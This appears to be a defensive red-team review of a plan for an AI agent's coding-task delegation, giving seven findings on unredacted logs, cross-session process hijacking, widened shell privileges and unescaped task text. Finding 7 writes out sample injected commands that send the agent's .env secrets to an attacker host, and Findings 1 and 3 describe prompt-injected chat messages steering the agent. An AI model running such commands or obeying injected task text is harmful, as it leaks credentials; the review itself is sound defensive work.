# Red-Team Review — CCS Delegation Timeout/Progress-Tracking Fix

Reviewed: plan.md, phase-01/02/03. Verified claims against real source at
`/home/ubuntu/workspace/hermes-agent` (tools/terminal_tool.py,
tools/process_registry.py, agent/skill_utils.py, agent/redact.py,
tools/file_tools.py, tools/approval.py) and live host state (read-only sudo).

## Finding 1: New redirected log file bypasses ALL secret redaction and is directly readable by the same skill's own toolset
- **Severity:** Critical
- **Location:** Phase 1, section "Requirements #2" (command template) + "Risk Assessment" (only flags "no rotation defined" — never mentions redaction)
- **Flaw:** The plan's new default command shell-redirects the delegated CLI's raw stdout/stderr straight to disk: `... --output-format stream-json --verbose --include-partial-messages > /home/hermes/.hermes/logs/delegation-<run-id>.jsonl 2>&1`. This redirect happens at the OS/shell level, entirely outside Hermes' Python process. The ONLY redaction path in this codebase is `_redact_process_result()` (`tools/process_registry.py:2088-2110`), which wraps `output`/`output_preview`/`command` fields returned by `process(action=poll|log|wait)` — i.e. redaction is applied to values *returned through the tool call*, never to bytes written directly to a file by a subprocess. Nothing in `spawn_local()` (`tools/process_registry.py:723-795`) touches the redirect target file.
- **Failure scenario:** A delegated `/ck:cook`/`/ck:brainstorm` sub-session running with `--allowedTools Read,Edit,Bash` reads a `.env` file, an AWS credential, or a GitHub token during its work (routine for a coding task). With `stream-json --verbose --include-partial-messages`, that content streams into the transcript and lands verbatim in `delegation-<run-id>.jsonl` on disk. The skill's own frontmatter already grants the `file` toolset (`skills/dev/coding-agent-delegate/SKILL.md:8-12`), whose `read_file`/`search_files` handlers (`tools/file_tools.py:1836-1893`) have **zero** redact call in their code path (confirmed by grep — no `redact` reference anywhere in `_handle_read_file`/`read_file_tool`). Any later turn in the same or a different session — including one driven by an attacker-crafted Telegram follow-up like "read me the latest delegation log" — retrieves the secret in the clear, with no redaction layer in between. This is a strictly worse posture than today's foreground path, which never wrote a persistent unredacted transcript to disk.
- **Evidence:** `tools/process_registry.py:2088-2110` (redaction scope = process-tool return values only); `tools/file_tools.py:1836-1838,1890-1893` (`read_file`/`search_files` registered under `toolset="file"`, no redact call); `skills/dev/coding-agent-delegate/SKILL.md:8-12` (skill already declares `file` toolset).
- **Suggested fix:** Either (a) route ALL output exclusively through `process(action=log)` (drop the raw file redirect) so redaction is always applied before content is observable, or (b) if a durable file is required for the "survives Hermes restarts" goal, pipe writes through the same `redact_terminal_output`/`redact_sensitive_text` functions before they touch disk, and restrict/flag the path so `read_file`/`search_files` cannot return it unredacted.

## Finding 2: `process(action=poll|log|wait|kill|write|submit|close)` has no session-ownership check — cross-session hijack/DoS
- **Severity:** High
- **Location:** Phase 1, "Requirements #5" (documents `poll`/`wait`/`log` as the follow-up procedure) — no mention anywhere in Phase 1/3 of session isolation
- **Flaw:** `_handle_process()` requires only a bare `session_id` string for `poll`, `log`, `wait`, `kill`, `write`, `submit`, `close` (`tools/process_registry.py:2131-2147`) — none of these check the caller's `task_id`/`session_key` against the target session's owner. Contrast with `list` (same function, `:2119-2129`), which explicitly filters by `session_key`/`task_id` (`process_registry.py:1538-1560`) specifically because cross-session visibility is a known concern (comment: "share the gateway session_key and can block session reset (#29177)"). The isolation that exists for `list` was not extended to the action handlers that actually read/mutate state.
- **Failure scenario:** Session IDs are `proc_{uuid4().hex[:12]}` (48 bits, `process_registry.py:682,822`) — not trivially guessable in isolation, but the moment an ID is echoed anywhere shared (a Kanban card comment, a shared log tail, an error message, or simply because the plan's own new artifact path embeds `<run-id>` predictably in a shared, world-readable-by-hermes directory), any other concurrent Hermes session that has the `terminal`/`process` toolset (which this plan is about to make the *default* mechanism for delegation, i.e. common) can `process(action="kill", session_id=...)` another Telegram user's in-flight delegation, or `poll`/`log`/`wait` it to read its (unredacted, per Finding 1) output. This plan adopts this exact mechanism as the new default and never evaluates this boundary.
- **Evidence:** `tools/process_registry.py:2131-2147` (no ownership check on poll/log/wait/kill/write/submit/close); `:1538-1560` (ownership filter that exists only for `list`); `:682` (`id=f"proc_{uuid.uuid4().hex[:12]}"`).
- **Suggested fix:** Before adopting `process(poll/log/wait/kill)` as the default delegation-tracking mechanism, add a `session_key`/`task_id` ownership check to those action handlers (mirroring `list_sessions`' filter), or explicitly document in the skill that background session IDs must be treated as capability tokens and never echoed outside the originating session.

## Finding 3: New default command template silently drops the existing least-privilege `--allowedTools "Read,Edit"` (no-Bash) variant
- **Severity:** High
- **Location:** Phase 1, "Requirements #2" (single code block, lines ~69-78) and "Requirements #4" (decision rule)
- **Flaw:** The CURRENT `SKILL.md` explicitly offers two allowlists and picks between them based on need: `Read,Edit` for "edit-only tasks that don't need shell access" (`SKILL.md:71-74`) and `Read,Edit,Bash` reserved for "tasks that explicitly need to run commands" (`SKILL.md:75-78`). Phase 1's rewritten default (the ONLY code block given for the new background pattern) hardcodes `--allowedTools "Read,Edit,Bash"` and the accompanying decision rule (phase-01:85-87) branches purely on task type/turn-count ("single-file bugfix, `--max-turns` ≤ 10 → foreground OK. Anything invoking a `/ck:*` meta-skill, `parallel=`, or without a tight turn bound → background") — never on whether Bash is actually required.
- **Failure scenario:** A long-running, edit-only delegation (e.g. "add tests for src/payments/, split into 3 subtasks" — the plan's own `parallel=3` example, phase-01 Success Criteria item 5) previously could run with the narrower `Read,Edit` set. Under the rewritten Tier 1, because it's non-trivial (>1-2 min, uses `parallel=`), it now defaults to `Read,Edit,Bash` per the single code block given — granting shell execution to every backgrounded delegation whether or not the task needs it. Since the `<task>` string ultimately originates from Telegram chat input, this is a straightforward privilege-widening of the blast radius reachable by a prompt-injected or malicious task description.
- **Evidence:** `skills/dev/coding-agent-delegate/SKILL.md:71-78` (current two-tier allowlist); plan's phase-01 Requirements #2 code block (only shows `Read,Edit,Bash`); phase-01 Requirements #4 decision rule (branches on turn-count/meta-skill, not on Bash necessity).
- **Suggested fix:** Preserve the existing Bash-vs-no-Bash distinction as an orthogonal axis to foreground-vs-background; the rewritten procedure needs a `Read,Edit` (no Bash) background example too, and the decision rule should keep asking "does this task need shell?" independently of "is it long-running?".

## Finding 4: Redirecting stdout/stderr to a file inside `command=` starves `process(action=poll|log)`'s own output buffer, undermining the plan's stated purpose and making Finding 1's unredacted file the ONLY source of output
- **Severity:** High
- **Location:** Phase 1, "Requirements #2" (command template) vs "Requirements #5" (documents `poll`/`log` as valid ways to check progress); Phase 3 Success Criteria ("`process(action='poll')` returns mid-run status")
- **Flaw:** `process_registry.spawn_local()` runs the given `command` via `subprocess.Popen([shell, "-lic", f"set +m; {command}"], stdout=PIPE, stderr=STDOUT, ...)` (`tools/process_registry.py:744-753`) and a reader thread drains that pipe into `session.output_buffer` (`:762-769`), which is exactly what `poll()`'s `output_preview` (`:1209-1240`) and `read_log()` read from. The plan's proposed `command` string itself redirects the inner `ccs`/`claude` process's stdout/stderr to a file (`> .../delegation-<run-id>.jsonl 2>&1`) *before* it would reach the outer shell's own stdout — so the outer shell (the thing Popen's PIPE is actually attached to) emits nothing. `session.output_buffer` will remain effectively empty for the entire run.
- **Failure scenario:** Phase 1 documents `process(action="log", session_id=...)` as one of three follow-up mechanisms "to pull output without ending the background session" (phase-01:88-92), and Phase 3's Success Criteria explicitly requires "`process(action='poll')` returns mid-run status" to be demonstrated. As implemented, `poll`/`log` will return only status/pid/exit-code metadata with an empty/near-empty `output_preview` — the actual transcript content is observable ONLY by directly tailing the redirected file. This contradicts the plan's own stated value proposition (mid-run progress via Hermes' native tooling) and quietly makes Finding 1's unredacted file the sole channel for any content at all, rather than one of two channels — there is no redacted fallback once this redirect ships as specified.
- **Evidence:** `tools/process_registry.py:744-753` (Popen stdout=PIPE/stderr=STDOUT wired to the *outer shell's* stdout, not to the file the inner command redirects to); `:1209-1240` (`poll()` reads `session.output_buffer`, populated only by that pipe).
- **Suggested fix:** Do not shell-redirect inside `command=`; let `spawn_local`'s own pipe capture the output (it already lands in `session.output_buffer`/`read_log()`), and separately `tee` to the durable file if a disk copy is required (`... | tee /home/hermes/.hermes/logs/delegation-<run-id>.jsonl`), so both channels stay populated and consistent — while still needing Finding 1's redaction fix for the `tee` target.

## Finding 5: Plan's own bug evidence already falsifies the premise behind "Unresolved Question 1" (`toolsets:` gating) — and the real gating schema is a different, unaddressed key
- **Severity:** Medium
- **Location:** Phase 1, "Unresolved Questions #1"; Phase 3, "Requirements #7"
- **Flaw:** Phase 1/3 both treat "does `toolsets:` frontmatter gate runtime tool access?" as an open question requiring live testing. But plan.md's own Overview (lines 25-31) quotes today's `agent.log` showing the exact `coding-agent-delegate`-driven session already successfully invoking `terminal` — even though the CURRENT `SKILL.md:8-12` `toolsets:` list is `[delegate_task, kanban, sandbox, file]` and does **not** include `terminal`. That is direct, already-in-hand evidence that the top-level `toolsets:` key does not gate tool availability. Separately, grep of the real Hermes loader shows the actual per-skill tool-scoping schema it reads is nested under `metadata.hermes.requires_toolsets` (`agent/skill_utils.py:541-555`), not a bare top-level `toolsets:` key — the schema this project's `SKILL.md` uses doesn't match what the loader parses at all. The real enforcement point for which tool *definitions* reach the model is `enabled_toolsets`, set once per session/agent at init (`model_tools.py:354-372`, `agent/agent_init.py:179,495`), not per-skill-invocation.
- **Failure scenario:** Because the plan frames this as an open "security-relevant" access-control question ("Add `terminal` to the list regardless — zero cost if descriptive-only, required if enforced"), a reader could believe adding `terminal` to this skill's frontmatter is meaningfully restricting or granting tool access to an attacker-controlled Telegram-triggered invocation. It is neither: the field name doesn't match the schema the loader reads, and the plan's own evidence already shows `terminal` was reachable before the change. Phase 3's plan to "empirically resolve" this live is testing against the wrong file (skill frontmatter) rather than checking `agent/skill_utils.py`/`enabled_toolsets` config, which is where actual gating (if any) lives.
- **Evidence:** plan.md:25-31 (agent.log shows terminal already invoked); `SKILL.md:8-12` (no `terminal` in current toolsets); `agent/skill_utils.py:541-555` (`extract_skill_conditions` reads `metadata.hermes.requires_toolsets`/`requires_tools`, not a top-level `toolsets:` key); `model_tools.py:354-372` (`enabled_toolsets` is session-level, not skill-level).
- **Suggested fix:** Drop this as an "unresolved question needing live testing" — the evidence needed is already in the plan and in `agent/skill_utils.py`. State plainly: this skill's `toolsets:` field is not the schema the loader reads and does not gate anything; if per-skill tool restriction is actually wanted as a control, it needs `metadata.hermes.requires_toolsets`/`requires_tools`, and even that (per its own docstring) looks like an activation-condition field, not an enforcement boundary — verify against `agent/tool_executor.py` before relying on it for anything security-relevant.

## Finding 6: `<run-id>` construction is unspecified — no sanitization requirement stated for a value embedded in a shell redirect target
- **Severity:** Medium
- **Location:** Phase 1, "Requirements #2" (command template uses `delegation-<run-id>.jsonl` as a bare placeholder)
- **Flaw:** Nowhere in Phase 1 (or Phase 2/3) is `<run-id>`'s generation method specified — not "use the `process` session_id" (which doesn't exist yet at the time the `command=` string must be composed, since `terminal(background=true)` only returns the session_id *after* spawning), not "server-generated UUID," not "timestamp." The plan leaves this to whoever/whatever (the LLM, at call-composition time) fills in the template.
- **Failure scenario:** If the value used for `<run-id>` is ever derived from task-adjacent content (a slugified task title, a hash including user text) rather than a value the agent mints independently of user input, a crafted task string could produce a `<run-id>` containing `../` sequences or shell metacharacters, causing the redirect target to escape `/home/hermes/.hermes/logs/` (path traversal / arbitrary file write) or to inject additional shell syntax after the intended `>` redirect. Even absent malice, without a specified generation rule, two concurrent delegations could collide on the same filename.
- **Evidence:** Phase 1 Requirements #2 code block — `<run-id>` appears only as an untyped placeholder, no generation/sanitization rule given anywhere in the phase file.
- **Suggested fix:** Specify explicitly: `<run-id>` must be generated by the calling agent independently of any user-supplied text (e.g. `date +%s`-based or a fresh random token minted before constructing the command string), never derived from the task string, and the rewritten SKILL.md should say so explicitly rather than leaving it implicit.

## Finding 7: Unescaped `<task>` interpolation into a double-quoted shell argument — reused verbatim in the new higher-privilege background path
- **Severity:** Medium
- **Location:** Phase 1, "Requirements #2" (new template `-p "<task>" ... > .../delegation-<run-id>.jsonl 2>&1`) — same unescaped pattern as current `SKILL.md:73,77,85`
- **Flaw:** The task text — ultimately Telegram-chat-origin, per the plan's own threat surface (`coding-agent-delegate` is invoked by chat command) — is interpolated directly inside a double-quoted `-p "<task>"` shell argument with no escaping/quoting guidance anywhere in the skill. `_check_all_guards`/tirith does run over the assembled command string regardless of `background` (`tools/terminal_tool.py:2230-2234`, not conditioned on `background`), but `DANGEROUS_PATTERNS` (`tools/approval.py:381-420`) is a curated list of destructive-signature patterns (`rm -rf`, `curl|sh`, `chmod 777`, fork bombs, etc.) — it has no way to catch an injected command that doesn't match a known-dangerous shape, e.g. `curl -s https://attacker/x -d @/home/hermes/.hermes/.env` (silent exfiltration) or `git push --force` composed via a task string containing an embedded `"` that breaks out of the intended quoted argument.
- **Failure scenario:** A Telegram message like `/coding-agent-delegate "fix bug" && curl attacker.example/c -d @~/.hermes/.env repo=x` or a task string containing a literal `"` followed by shell syntax, once dropped verbatim into the new template by the composing agent, executes as the `hermes` user via `terminal(background=true)` — silently, since background mode returns immediately and `notify_on_complete` only reports exit status, not command content.
- **Evidence:** `tools/approval.py:381-420` (DANGEROUS_PATTERNS = signature list, not general injection detection); current `SKILL.md:73,77,85` (pre-existing unescaped interpolation pattern, unchanged/extended by this plan, not remediated).
- **Suggested fix:** Add explicit guidance to the rewritten Tier 1 procedure that `<task>` must be shell-escaped (e.g. via `shlex.quote`-equivalent reasoning, single-quoted with `'"'"'` escaping, or passed via a temp file / stdin rather than inline interpolation) before being embedded in any `terminal(command=...)` string — this is a pre-existing gap the plan had the opportunity to close while touching this exact code block and did not.
